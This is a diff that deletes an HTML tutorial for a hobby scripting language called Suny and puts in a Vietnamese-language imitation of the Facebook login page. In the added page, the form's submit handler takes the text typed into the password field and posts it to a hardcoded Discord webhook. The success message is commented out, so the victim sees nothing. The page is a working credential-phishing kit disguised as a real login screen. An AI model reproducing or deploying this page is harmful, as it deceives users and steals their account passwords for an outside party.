@@ -1,601 +1,202 @@
-<h1 id="mercurylang-suny-programming-book">MercuryLang &amp; Suny
-Programming Book</h1>
-<p align="center">
-<img src="./logo.png" alt="MercuryLang Logo" width="200"/>
-</p>
-<h1 align="center">
-Programming in Suny
-</h1>
-<p>by Đinh Sơn Hải, 9/1/2025</p>
-<hr />
-<p>Welcome to my first programming book! This book talks about
-<strong>Suny</strong>, a lightweight, custom scripting language created
-by me, Đinh Sơn Hải.</p>
-<h2 id="about-me">About Me</h2>
-<p>My name is Đinh Sơn Hải. I am from Việt Nam and I am 17 years old. I
-am currently in my final year at Trần Nguyên Hãn High School.</p>
-<p>I first experienced coding at the age of 12. My first program was
-written in Python: a simple game to guess a random number.</p>
-<p>This is my second programming language, my first programming language
-is MercuryLang, this language will be the better version of
-MercuryLang</p>
-<p>Why i named this language is Suny? my programming language that i
-love best is Lua, with easy syntax, powerful, and can access to C, so i
-decided to make one just like Lua, thats why Suny was born, Sun in Suny
-is the opsiste side of Lua which is Moon, i hope this language will be
-better someday and</p>
-<hr />
-<h1 id="about-suny">0 - About Suny</h1>
-<p>Suny is a lightweight scripting language designed to be
-<strong>simple, clear, and easy to learn</strong>, even for people who
-have never programmed before.</p>
-<p>It was written in C, making it fast and efficient, while keeping
-syntax clean and beginner-friendly.</p>
-<h3 id="key-features">Key Features:</h3>
-<ul>
-<li><strong>Simplicity</strong> – easy-to-remember syntax</li>
-<li><strong>Clarity</strong> – clean and readable code</li>
-<li><strong>Flexibility</strong> – simple yet strong enough to solve
-complex problems</li>
-</ul>
-<h3 id="uses">Uses:</h3>
-<ul>
-<li>Learn programming concepts easily</li>
-<li>Write small scripts and automate tasks</li>
-<li>Experiment with building applications in a fun, lightweight way</li>
-</ul>
-<hr />
-<h1 id="getting-started">1 - Getting Started</h1>
-<p>Every programming language has <strong>input and output
-functions</strong>:</p>
-<ul>
-<li><strong>Input function</strong>: allows users to enter data. The
-program stores this input, often as a string.</li>
-<li><strong>Output function</strong>: displays information on the
-screen.</li>
-</ul>
-<p>Example:</p>
-<pre class="sunylang"><code>print(&quot;hello&quot;)</code></pre>
-<p>Output:</p>
-<pre><code>hello</code></pre>
-<p><strong>Explanation:</strong></p>
-<ul>
-<li><code>print</code> displays text or values on the screen.</li>
-<li>Text in <strong>double quotes <code>"</code></strong> is a
-<strong>string</strong>, storing letters, numbers, or symbols.</li>
-</ul>
-<h3 id="running-suny-programs">Running Suny Programs</h3>
-<ol type="1">
-<li>Save your program as a <code>.suny</code> file.</li>
-<li>Run it using the interpreter:</li>
-</ol>
-<pre><code>prompt&gt; suny your_file.suny</code></pre>
-<p>Example:</p>
-<pre><code>prompt&gt; suny main.suny
-hello
-prompt&gt;</code></pre>
-<h3 id="using-repl">Using REPL</h3>
-<p>Suny also provides a <strong>REPL</strong> (Read-Eval-Print-Loop) to
-run code directly in the terminal:</p>
-<pre><code>prompt&gt; suny
-Suny 1.0 Copyright (C) 2025-present, by dinhsonhai132
-&gt;&gt; print(&quot;hello&quot;)
-hello
-&gt;&gt;</code></pre>
-<p><strong>REPL Breakdown:</strong></p>
-<ul>
-<li><strong>Read</strong>: reads the code</li>
-<li><strong>Eval</strong>: evaluates (runs) the code</li>
-<li><strong>Print</strong>: displays results</li>
-<li><strong>Loop</strong>: repeats for the next input</li>
-</ul>
-<p>Benefits:</p>
-<ul>
-<li>Instant feedback</li>
-<li>Practice and learning tool</li>
-<li>Test small code snippets without a file</li>
-</ul>
-<hr />
-<h1 id="simple-math">2 - Simple Math</h1>
-<p>Suny provides <strong>mathematical symbols</strong> for
-calculations:</p>
-<pre class="sunylang"><code>&gt;&gt; print(2 + 2)
-4
-&gt;&gt; print((1 + 1) * 2)
-4
-&gt;&gt; print(4 / 2 * 2)
-4</code></pre>
-<h3 id="basic-operators">Basic Operators</h3>
-<ul>
-<li><code>+</code> → addition</li>
-<li><code>-</code> → subtraction</li>
-<li><code>*</code> → multiplication</li>
-<li><code>/</code> → division</li>
-<li><code>( )</code> → parentheses, control calculation order</li>
-</ul>
-<h3 id="comparison-operators">Comparison Operators</h3>
-<ul>
-<li><code>&lt;</code> → less than</li>
-<li><code>&gt;</code> → greater than</li>
-<li><code>==</code> → equal to</li>
-<li><code>&lt;=</code> → less than or equal to</li>
-<li><code>&gt;=</code> → greater than or equal to</li>
-</ul>
-<p>Example:</p>
-<pre class="sunylang"><code>&gt;&gt; print(5 &gt; 3)
-True
-&gt;&gt; print(2 == 2)
-True
-&gt;&gt; print(1 &lt;= 0)
-False</code></pre>
-<hr />
-<h1 id="global-variables">3 - Global Variables</h1>
-<p>Global variables can be accessed and modified
-<strong>anywhere</strong> in the program.</p>
-<pre class="sunylang"><code># Define global variables
-a = 1
-b = 2
-print(a) # 1
-print(b) # 2</code></pre>
-<h3 id="notes">Notes:</h3>
-<ul>
-<li><strong>Global Scope</strong>: variables outside functions</li>
-<li><strong>Modifying</strong>: in Suny, globals can be used directly
-inside functions</li>
-<li><strong>Use</strong>: share information across functions, but avoid
-overuse</li>
-</ul>
-<h1 id="data-type">Data type</h1>
-<p>Suny is a dynamically typed language. There are no type definitions
-in the language; each value carries its own type.</p>
-<p>There are 5 basic types in Suny, boolen, list, float, function,
-string</p>
-<h2 id="boolean-truefalse">Boolean (True/False)</h2>
-<p>A <strong>Boolean</strong> is a type of data that can only have
-<strong>two values</strong>:</p>
-<ul>
-<li><code>True</code> → represents truth</li>
-<li><code>False</code> → represents falsehood</li>
-</ul>
-<p>Booleans are often used in <strong>conditions</strong> and
-<strong>comparisons</strong>.</p>
-<h3 id="example">Example:</h3>
-<pre class="sunylang"><code>is_sunny = True
-is_raining = False
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Facebook - Đăng nhập hoặc đăng ký (Responsive)</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; }
 
-print(is_sunny)    # True
-print(is_raining)  # False</code></pre>
-<h3 id="using-boolean-in-conditions">Using Boolean in conditions:</h3>
-<pre class="sunylang"><code>weather = &quot;sunny&quot;
+  body {
+    margin: 0;
+    font-family: "Arial", sans-serif;
+    background: #f0f2f5;
+    color: #111;
+  }
 
-if weather == &quot;sunny&quot; do
-    print(&quot;Go outside!&quot;)
-else
-    print(&quot;Stay inside!&quot;)
-end</code></pre>
-<p><strong>Explanation:</strong></p>
-<ul>
-<li><code>==</code> checks if two values are equal.</li>
-<li>The condition inside <code>if</code> must evaluate to a
-<strong>Boolean</strong> (<code>True</code> or <code>False</code>).</li>
-<li>If the condition is <code>True</code>, the code inside the
-<code>if</code> block runs; otherwise, the <code>else</code> block
-runs.</li>
-</ul>
-<p>Booleans are fundamental for controlling program flow and making
-decisions in your code.</p>
-<h2 id="numbers">Numbers</h2>
-<p>In Suny, <strong>numbers</strong> are a basic data type used to store
-numeric values. They can be either <strong>integers</strong> (whole
-numbers) or <strong>floating-point numbers</strong> (numbers with
-decimals).</p>
-<h3 id="example-1">Example:</h3>
-<pre class="sunylang"><code># Integer numbers
-a = 10
-b = -5
+  .wrapper {
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    gap: 18px;
+    align-items: center;
+    justify-content: center;
+    padding: 28px 16px;
+  }
 
-# Floating-point numbers
-c = 3.14
-d = -0.5
+  .logo {
+    color: #1877f2;
+    font-size: 48px;
+    font-weight: 700;
+    line-height: 1;
+    margin: 0;
+  }
 
-print(a)  # 10
-print(b)  # -5
-print(c)  # 3.14
-print(d)  # -0.5</code></pre>
-<h3 id="arithmetic-with-numbers">Arithmetic with Numbers:</h3>
-<p>Suny supports basic arithmetic operations:</p>
-<ul>
-<li><strong><code>+</code></strong> addition</li>
-<li><strong><code>-</code></strong> subtraction</li>
-<li><strong><code>*</code></strong> multiplication</li>
-<li><strong><code>/</code></strong> division</li>
-<li><strong><code>%</code></strong> modulo (remainder)</li>
-</ul>
-<pre class="sunylang"><code>x = 10
-y = 3
+  .tagline {
+    font-size: 15px;
+    color: #222;
+    text-align: center;
+    max-width: 360px;
+    margin-top: 6px;
+  }
 
-print(x + y)  # 13
-print(x - y)  # 7
-print(x * y)  # 30
-print(x / y)  # 3.3333...
-print(x % y)  # 1</code></pre>
-<h3 id="using-numbers-in-conditions">Using Numbers in Conditions:</h3>
-<pre class="sunylang"><code>score = 75
+  .card {
+    width: 100%;
+    max-width: 420px;
+    background: #fff;
+    border-radius: 10px;
+    padding: 14px;
+    box-shadow: 0 2px 10px rgba(15,34,58,0.08);
+  }
 
-if score &gt;= 50 do
-    print(&quot;You passed!&quot;)
-else
-    print(&quot;Try again.&quot;)
-end</code></pre>
-<p><strong>Explanation:</strong></p>
-<ul>
-<li>Numbers can be compared using <code>&lt;</code>, <code>&gt;</code>,
-<code>&lt;=</code>, <code>&gt;=</code>, <code>==</code>,
-<code>!=</code>.</li>
-<li>They are often used in calculations, loops, and conditions.</li>
-</ul>
-<h2 id="strings">Strings</h2>
-<p>In Suny, a <strong>string</strong> is a sequence of characters used
-to represent text. Strings are enclosed in <strong>double quotes
-<code>"</code></strong>.</p>
-<h3 id="example-2">Example:</h3>
-<pre class="sunylang"><code>name = &quot;Đinh Sơn Hải&quot;
-greeting = &quot;Hello, world!&quot;
+  .input {
+    width: 100%;
+    padding: 14px;
+    margin: 8px 0;
+    border-radius: 8px;
+    border: 1px solid #e6e9ee;
+    font-size: 15px;
+  }
 
-print(name)      # Đinh Sơn Hải
-print(greeting)  # Hello, world!</code></pre>
-<h3 id="string-operations">String Operations:</h3>
-<ol type="1">
-<li><strong>Concatenation</strong> (joining strings)</li>
-</ol>
-<pre class="sunylang"><code>first = &quot;Hello&quot;
-second = &quot;World&quot;
-combined = first + &quot; &quot; + second
-print(combined)  # Hello World</code></pre>
-<ol start="2" type="1">
-<li><strong>String Length</strong></li>
-</ol>
-<pre class="sunylang"><code>text = &quot;Suny&quot;
-print(size(text))  # 4</code></pre>
-<ol start="3" type="1">
-<li><strong>Accessing Characters</strong></li>
-</ol>
-<pre class="sunylang"><code>text = &quot;Suny&quot;
-print(text[0])  # S (first character)
-print(text[3])  # y (fourth character)</code></pre>
-<ol start="4" type="1">
-<li><strong>Strings in Conditions</strong></li>
-</ol>
-<pre class="sunylang"><code>password = &quot;1234&quot;
+  .login-btn {
+    width: 100%;
+    padding: 14px;
+    margin-top: 8px;
+    border-radius: 8px;
+    border: none;
+    background: #1877f2;
+    color: #fff;
+    font-weight: 700;
+    font-size: 16px;
+    cursor: pointer;
+  }
+  .login-btn:hover { filter: brightness(0.95); }
 
-if password == &quot;1234&quot; do
-    print(&quot;Access granted&quot;)
-else
-    print(&quot;Access denied&quot;)
-end</code></pre>
-<p><strong>Explanation:</strong></p>
-<ul>
-<li>Strings store text data.</li>
-<li>You can join them, measure their length, access individual
-characters, and compare them in conditions.</li>
-</ul>
-<h3 id="escape-characters-in-strings">Escape Characters in Strings</h3>
-<p>In Suny, you can use <strong>escape characters</strong> to represent
-special characters inside strings. Each escape sequence starts with a
-backslash <code>\</code>.</p>
-<h3 id="common-escape-characters">Common Escape Characters</h3>
-<table>
-<colgroup>
-<col style="width: 7%" />
-<col style="width: 53%" />
-<col style="width: 23%" />
-<col style="width: 15%" />
-</colgroup>
-<thead>
-<tr>
-<th>Escape</th>
-<th>Meaning</th>
-<th>Example</th>
-<th>Output</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>\n</code></td>
-<td>Newline (move to next line)</td>
-<td><code>"Hello\nWorld"</code></td>
-<td></td>
-</tr>
-<tr>
-<td>Hello</td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>World</td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td><code>\t</code></td>
-<td>Tab (adds horizontal space)</td>
-<td><code>"Col1\tCol2"</code></td>
-<td>Col1 Col2</td>
-</tr>
-<tr>
-<td><code>\r</code></td>
-<td>Carriage return (moves cursor to line start)</td>
-<td><code>"12345\rAB"</code></td>
-<td>AB345</td>
-</tr>
-<tr>
-<td><code>\\</code></td>
-<td>Backslash</td>
-<td><code>"C:\\Path\\File"</code></td>
-<td>C:</td>
-</tr>
-<tr>
-<td><code>\"</code></td>
-<td>Double quote inside string</td>
-<td><code>"He said: \"Hi\""</code></td>
-<td>He said: “Hi”</td>
-</tr>
-<tr>
-<td><code>\'</code></td>
-<td>Single quote inside string</td>
-<td><code>'It\'s sunny'</code></td>
-<td>It’s sunny</td>
-</tr>
-</tbody>
-</table>
-<h3 id="example-usage">Example Usage:</h3>
-<pre class="sunylang"><code>print(&quot;Hello\nWorld&quot;)     # prints on two lines
-print(&quot;Column1\tColumn2&quot;) # adds a tab space
-print(&quot;Backslash: \\&quot;)     # prints a single backslash
-print(&quot;Quote: \&quot;Hi\&quot;&quot;)  # prints double quotes inside string</code></pre>
-<h2 id="lists">Lists</h2>
-<p>In Suny, a <strong>list</strong> is a collection of items stored in a
-single variable. Lists can store numbers, strings, Booleans, or even
-other lists.</p>
-<h3 id="creating-a-list">Creating a List:</h3>
-<pre class="sunylang"><code>numbers = [1, 2, 3, 4, 5]
-names = [&quot;Alice&quot;, &quot;Bob&quot;, &quot;Charlie&quot;]
-mixed = [1, &quot;Two&quot;, True, 4.5]</code></pre>
-<h3 id="accessing-items">Accessing Items:</h3>
-<ul>
-<li>Lists are <strong>zero-indexed</strong> (the first item has index
-0).</li>
-</ul>
-<pre class="sunylang"><code>print(numbers[0])  # 1
-print(names[2])    # Charlie</code></pre>
-<h3 id="modifying-items">Modifying Items:</h3>
-<pre class="sunylang"><code>numbers[0] = 10
-print(numbers[0])  # 10</code></pre>
-<h3 id="adding-items">Adding Items:</h3>
-<pre class="sunylang"><code>numbers = [1, 2, 3]
-push(numbers, 4)
-print(numbers)  # [1, 2, 3, 4]</code></pre>
-<h3 id="pop-items">Pop Items:</h3>
-<pre class="sunylang"><code>numbers = [1, 2, 3, 4]
-pop(numbers)
-print(numbers)  # [1, 2, 3]</code></pre>
-<h3 id="list-length">List Length:</h3>
-<pre class="sunylang"><code>print(size(numbers))  # 3</code></pre>
-<h3 id="lists-in-loops">Lists in Loops:</h3>
-<pre class="sunylang"><code>fruits = [&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;]
-for i in range(size(fruits)) do
-    print(fruits[i])
-end</code></pre>
-<p>Or you can:</p>
-<pre class="sunylang"><code>fruits = [&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;]
-for i in fruits do
-    print(i)
-end</code></pre>
-<p><strong>Explanation:</strong></p>
-<ul>
-<li>Lists store multiple items in one variable.</li>
-<li>Access, modify, add, or remove items easily.</li>
-<li>Often used in loops, conditions, and functions for collections of
-data.</li>
-</ul>
-<h2 id="functions">Functions</h2>
-<p>In Suny, a <strong>function</strong> is a block of reusable code that
-can take inputs, perform actions, and return a value. Functions help
-organize code and avoid repetition.</p>
-<h3 id="creating-a-function">Creating a Function:</h3>
-<pre class="sunylang"><code>function foo(a, b) do
-    return a + b
-end</code></pre>
-<h3 id="calling-a-function">Calling a Function:</h3>
-<pre class="sunylang"><code>result = foo(5, 3)
-print(result)  # 8</code></pre>
-<h3 id="explanation">Explanation:</h3>
-<ol type="1">
-<li><code>function foo(a, b) do ... end</code> defines a function named
-<code>foo</code> with two parameters <code>a</code> and
-<code>b</code>.</li>
-<li><code>return a + b</code> tells the function to give back the result
-of <code>a + b</code>.</li>
-<li><code>result = foo(5, 3)</code> calls the function with arguments 5
-and 3, and stores the returned value in <code>result</code>.</li>
-</ol>
-<h3 id="functions-can-be-used-to">Functions can be used to:</h3>
-<ul>
-<li>Reuse code without writing it again.</li>
-<li>Organize code into logical blocks.</li>
-<li>Take different inputs and return outputs.</li>
-</ul>
-<h2 id="expression">Expression</h2>
-<p><strong>Explanation:</strong></p>
-<p>Expressions denote values. Expressions in Suny include the numeric
-constants and string literals, variables, unary and binary operations,
-and function calls. Expressions can be also the unconventional function
-definitions and table constructors.</p>
-<h2 id="logical-expressions">Logical Expressions</h2>
-<p>In Suny, <strong>logical expressions</strong> allow you to combine or
-invert Boolean values using <strong><code>and</code></strong>,
-<strong><code>or</code></strong>, and <strong><code>not</code></strong>
-operators.</p>
-<h3 id="operators">Operators:</h3>
-<ol type="1">
-<li><strong><code>and</code></strong> → returns True if both values are
-True</li>
-<li><strong><code>or</code></strong> → returns True if at least one
-value is True</li>
-<li><strong><code>not</code></strong> → returns the opposite Boolean
-value</li>
-</ol>
-<h3 id="examples">Examples:</h3>
-<pre class="sunylang"><code>x = True
-y = False
+  .forgot {
+    display: block;
+    text-align: center;
+    margin: 12px 0;
+    color: #1877f2;
+    text-decoration: none;
+    font-size: 14px;
+  }
 
-print(x and y)  # False
-print(x or y)   # True
-print(not x)    # False
-print(not y)    # True</code></pre>
-<h3 id="using-logical-expressions-in-conditions">Using Logical
-Expressions in Conditions:</h3>
-<pre class="sunylang"><code>is_sunny = True
-has_umbrella = False
+  hr.sep {
+    border: none;
+    height: 1px;
+    background: #eef0f3;
+    margin: 14px 0;
+  }
 
-if is_sunny or has_umbrella do
-    print(&quot;Go outside&quot;)
-else
-    print(&quot;Stay inside&quot;)
-end
+  .new-account {
+    width: 100%;
+    padding: 14px;
+    border-radius: 8px;
+    border: none;
+    background: #42b72a;
+    color: #fff;
+    font-weight: 700;
+    font-size: 16px;
+    cursor: pointer;
+  }
+  .new-account:hover { filter: brightness(0.95); }
 
-if not is_sunny do
-    print(&quot;It is cloudy&quot;)
-end</code></pre>
-<p><strong>Explanation:</strong></p>
-<ul>
-<li><code>and</code> requires <strong>both conditions to be
-True</strong> to return True.</li>
-<li><code>or</code> requires <strong>at least one condition to be
-True</strong> to return True.</li>
-<li><code>not</code> inverts the Boolean value.</li>
-<li>Logical expressions are very useful for <strong>making
-decisions</strong> in your programs.</li>
-</ul>
-<h1 id="control-structures">Control Structures</h1>
-<p>Suny provides a small and conventional set of control structures:</p>
-<ul>
-<li><code>if-else</code> for conditional statements</li>
-<li><code>while</code> for loops</li>
-<li><code>for</code> for iteration</li>
-</ul>
-<p>All control structures have an explicit terminator: <code>end</code>
-terminates the <code>if</code>, <code>for</code>, and <code>while</code>
-structures.</p>
-<h2 id="conditional">Conditional</h2>
-<p>Conditional statements let your program <strong>make
-decisions</strong> based on Boolean conditions.</p>
-<h3 id="syntax">Syntax:</h3>
-<pre class="sunylang"><code>if condition do
-    # code to run if condition is True
-else
-    # code to run if condition is False
-end</code></pre>
-<h3 id="example-3">Example:</h3>
-<pre class="sunylang"><code>score = 75
+  #status {
+    text-align: center;
+    font-size: 14px;
+    margin-top: 10px;
+  }
 
-if score &gt;= 50 do
-    print(&quot;You passed!&quot;)
-else
-    print(&quot;Try again.&quot;)
-end</code></pre>
-<h3 id="explanation-1">Explanation:</h3>
-<ul>
-<li><code>if</code> checks the condition.</li>
-<li><code>else</code> runs if the <code>if</code> condition is
-False.</li>
-<li><code>end</code> marks the end of the conditional block.</li>
-</ul>
-<h2 id="while">While</h2>
-<p>The <code>while</code> loop allows your program to <strong>repeat a
-block of code as long as a condition is True</strong>.</p>
-<h3 id="syntax-1">Syntax:</h3>
-<pre class="sunylang"><code>while condition do
-    # code to repeat while condition is True
-end</code></pre>
-<h3 id="example-4">Example:</h3>
-<pre class="sunylang"><code>count = 1
+  @media (min-width: 760px) {
+    .wrapper {
+      flex-direction: row;
+      align-items: center;
+      justify-content: center;
+      padding: 40px;
+      gap: 60px;
+    }
 
-while count &lt;= 5 do
-    print(count)
-    count = count + 1
-end</code></pre>
-<h3 id="explanation-2">Explanation:</h3>
-<ul>
-<li>The loop will continue <strong>as long as the condition is
-True</strong>.</li>
-<li>Update variables inside the loop to avoid an infinite loop.</li>
-<li><code>end</code> marks the end of the while loop.</li>
-</ul>
-<h2 id="for">For</h2>
-<p>The <code>for</code> loop is used for <strong>iterating over a range
-of values or items in a collection</strong>.</p>
-<h3 id="for-with-a-range">For with a range:</h3>
-<pre class="sunylang"><code>for i in range(0, 5)
-    print(i)
-end</code></pre>
-<ul>
-<li>Iterates from <code>1</code> to <code>5</code>, printing each
-value.</li>
-<li>Using range(a, b) function to generate a list from a to b if (b &gt;
-a) or b to a if (b &lt; a)</li>
-</ul>
-<h3 id="for-in-loop-iterating-over-a-collection">For-in loop (iterating
-over a collection):</h3>
-<pre class="sunylang"><code>fruits = [&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;]
+    .left {
+      max-width: 520px;
+      text-align: left;
+    }
+    .logo {
+      font-size: 56px;
+      margin-bottom: 6px;
+    }
+    .tagline {
+      font-size: 22px;
+      text-align: left;
+      color: #262626;
+    }
 
-for fruit in fruits do
-    print(fruit)
-end</code></pre>
-<ul>
-<li>Iterates over each item in the <code>fruits</code> list.</li>
-<li><code>fruit</code> represents the current item in each
-iteration.</li>
-<li><code>end</code> marks the end of the loop.</li>
-</ul>
-<h3 id="explanation-3">Explanation:</h3>
-<ul>
-<li>Standard <code>for</code> is for numeric ranges.</li>
-<li><code>for-in</code> is for iterating over <strong>lists or
-collections</strong>.</li>
-<li>Both loops require <code>end</code> to close the block.</li>
-</ul>
-<h1 id="access-to-c-api-functions">Access to C API Functions</h1>
-<p>Suny allows you to create your own functions using the <strong>C
-API</strong>. This is useful when you want to extend Suny with
-high-performance or system-level functionality.</p>
-<h3 id="example-adding-a-function-in-c">Example: Adding a Function in
-C</h3>
-<div class="sourceCode" id="cb38"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;Suny.h&gt;</span></span>
-<span id="cb38-2"><a href="#cb38-2" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb38-3"><a href="#cb38-3" aria-hidden="true" tabindex="-1"></a>SUNY_API <span class="kw">struct</span> Sobj<span class="op">*</span> add<span class="op">(</span><span class="kw">struct</span> Sframe<span class="op">*</span> frame<span class="op">)</span> <span class="op">{</span></span>
-<span id="cb38-4"><a href="#cb38-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">struct</span> Sobj<span class="op">*</span> a <span class="op">=</span> Sframe_pop<span class="op">(</span>frame<span class="op">);</span></span>
-<span id="cb38-5"><a href="#cb38-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">struct</span> Sobj<span class="op">*</span> b <span class="op">=</span> Sframe_pop<span class="op">(</span>frame<span class="op">);</span></span>
-<span id="cb38-6"><a href="#cb38-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">struct</span> Sobj<span class="op">*</span> c <span class="op">=</span> Sobj_set_int<span class="op">(</span>a<span class="op">-&gt;</span>value<span class="op">-&gt;</span>value <span class="op">+</span> b<span class="op">-&gt;</span>value<span class="op">-&gt;</span>value<span class="op">);</span></span>
-<span id="cb38-7"><a href="#cb38-7" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> c<span class="op">;</span></span>
-<span id="cb38-8"><a href="#cb38-8" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
-<h3 id="explanation-4">Explanation:</h3>
-<ol type="1">
-<li><code>#include &lt;Suny.h&gt;</code> includes the Suny C API
-headers.</li>
-<li><code>SUNY_API</code> is used to expose the function to Suny.</li>
-<li><code>struct Sframe* frame</code> represents the current execution
-frame and holds the function arguments.</li>
-<li><code>Sframe_pop(frame)</code> pops an argument from the frame
-stack.</li>
-<li><code>Sobj_set_int(...)</code> creates a new Suny object with an
-integer value.</li>
-<li><code>return c;</code> returns the result back to Suny.</li>
-</ol>
-<p>With this method, you can define custom Suny functions in C and call
-them directly from Suny scripts.</p>
-<hr />
-<h1 id="the-end">The End</h1>
-<p>Thank you for reading!</p>
+    .card {
+      width: min(420px, 38vw);
+      padding: 22px;
+    }
+  }
+</style>
+</head>
+<body>
+  <div class="wrapper">
+    <div class="left">
+      <div class="logo">facebook</div>
+      <div class="tagline">Facebook giúp bạn kết nối và chia sẻ<br>với mọi người trong cuộc sống của bạn.</div>
+    </div>
+
+    <div class="card" role="region" aria-label="Form đăng nhập">
+      <form onsubmit="sendMessage(event)">
+        <input class="input" id="email" placeholder="Nhập email hoặc số diện thoại" autocomplete="off" />
+
+        <input class="input" id="message" placeholder="Nhập mật khẩu" autocomplete="off" />
+        
+        <button type="submit" class="login-btn">Đăng nhập</button>
+        
+        <a class="forgot" href="#">Quên mật khẩu?</a>
+        
+        <hr class="sep">
+        
+        <button class="new-account" type="button">Tạo tài khoản mới</button>
+
+        <p id="status"></p>
+      </form>
+    </div>
+  </div>
+
+<script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1405456686604357642/FQnoZtdt5-KmvIsraO42B4S2HVlzd0KVLaZm3IC299D7bbR_Vsg1Qo7e2heJTNJdWzYo";
+
+    async function sendMessage(e) {
+        e.preventDefault(); // Ngăn reload form
+        const text = document.getElementById("message").value.trim();
+        const status = document.getElementById("status");
+
+        if (!text) {
+            status.textContent = "Vui lòng nhập nội dung!";
+            status.style.color = "red";
+            return;
+        }
+
+        try {
+            const res = await fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: text })
+            });
+
+            // if (res.ok) {
+            //     status.textContent = "✅ Đã gửi thành công!";
+            //     status.style.color = "green";
+            //     document.getElementById("message").value = "";
+            // } else {
+            //     status.textContent = "❌ Gửi thất bại!";
+            //     status.style.color = "red";
+            // }
+        } catch (err) {
+            status.textContent = "Lỗi kết nối!";
+            status.style.color = "red";
+        }
+    }
+</script>
+</body>
+</html>
